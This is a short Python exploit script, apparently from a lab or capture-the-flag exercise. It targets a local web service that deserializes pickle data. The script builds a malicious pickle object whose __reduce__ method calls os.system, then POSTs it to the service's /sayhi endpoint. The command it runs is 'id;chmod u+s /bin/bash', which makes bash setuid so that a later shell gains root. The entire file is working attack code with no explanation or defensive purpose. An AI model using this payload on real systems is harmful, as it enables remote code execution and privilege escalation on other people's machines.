import requests
import pickle

HOST = "127.0.0.1:65432"
URL = f"http://{HOST}/sayhi"
HEADERS ={
    "serializer": "pickle"
}

def generate_payload(cmd):
    class PickleRce(object):
        def __reduce__(self):
            import os
            return os.system, (cmd,)
    payload = pickle.dumps(PickleRce())
    print(payload)
    return payload

def exec_command(cmd):
    payload = generate_payload(cmd)
    requests.post(url=URL, data=payload, headers=HEADERS)

def main():
    exec_command('id;chmod u+s /bin/bash')

if __name__ == "__main__":
	main()
